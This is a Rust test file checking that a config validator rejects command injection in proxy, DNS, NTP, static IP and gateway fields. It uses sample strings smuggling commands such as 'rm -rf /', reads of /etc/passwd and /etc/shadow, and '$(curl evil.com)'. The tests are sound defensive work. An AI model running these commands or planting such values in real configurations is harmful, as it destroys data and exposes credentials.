//! Tests for network fields (proxy, DNS, NTP, static IP, gateway).
//!
//! Bodies preserved verbatim from the original `inject.rs` test module.

use super::super::*;
use crate::config::{NetworkConfig, ProxyConfig};

#[test]
fn inject_rejects_shell_metachar_in_proxy() {
    let cfg = InjectConfig {
        proxy: ProxyConfig {
            http_proxy: Some("http://proxy.example.com; cat /etc/passwd".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_unsafe_dns_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["8.8.8.8; rm -rf /".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_unsafe_ntp_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            ntp_servers: vec!["ntp.example.com$(id)".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_ipv6_ntp_server() {
    // IPv6 addresses are valid NTP/DNS server addresses; the validator
    // uses is_safe_network_addr which allows colons for IPv6.
    let cfg = InjectConfig {
        network: NetworkConfig {
            ntp_servers: vec!["2001:db8::1".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "IPv6 NTP address must be accepted by the network-address validator"
    );
}

#[test]
fn inject_accepts_ipv6_dns_server() {
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["2001:4860:4860::8888".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "IPv6 DNS address must be accepted by the network-address validator"
    );
}

#[test]
fn inject_rejects_dns_with_shell_metachar() {
    // A DNS entry with a semicolon is still unsafe and must be rejected.
    let cfg = InjectConfig {
        network: NetworkConfig {
            dns_servers: vec!["1.1.1.1; rm -rf /".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "DNS entry with shell metacharacter must be rejected"
    );
}

#[test]
fn inject_rejects_proxy_with_backtick() {
    let cfg = InjectConfig {
        proxy: ProxyConfig {
            http_proxy: Some("http://proxy.example.com:3128`whoami`".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn static_ip_rejects_shell_metacharacters() {
    // static_ip is placed in cloud-init YAML, Kickstart --ip=, and preseed
    // directives.  Shell metacharacters must be rejected to prevent malformed
    // configs and potential injection into installer directives.
    for bad in &[
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/shadow",
        "$(curl evil.com)",
        "192.168.1.1\nnewline-injected",
    ] {
        let cfg = InjectConfig {
            static_ip: Some((*bad).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "static_ip {:?} must be rejected",
            bad
        );
    }
}

#[test]
fn static_ip_accepts_valid_cidr() {
    for good in &["192.168.1.10/24", "10.0.0.1/8", "2001:db8::1/64"] {
        let cfg = InjectConfig {
            static_ip: Some((*good).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "static_ip {:?} must be accepted",
            good
        );
    }
}

#[test]
fn gateway_rejects_shell_metacharacters() {
    for bad in &["10.0.0.1; rm -rf /", "10.0.0.1 | cat /etc/passwd"] {
        let cfg = InjectConfig {
            gateway: Some((*bad).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "gateway {:?} must be rejected",
            bad
        );
    }
}

#[test]
fn gateway_accepts_valid_ip() {
    for good in &["10.0.0.1", "192.168.1.1", "2001:db8::1"] {
        let cfg = InjectConfig {
            gateway: Some((*good).to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "gateway {:?} must be accepted",
            good
        );
    }
}
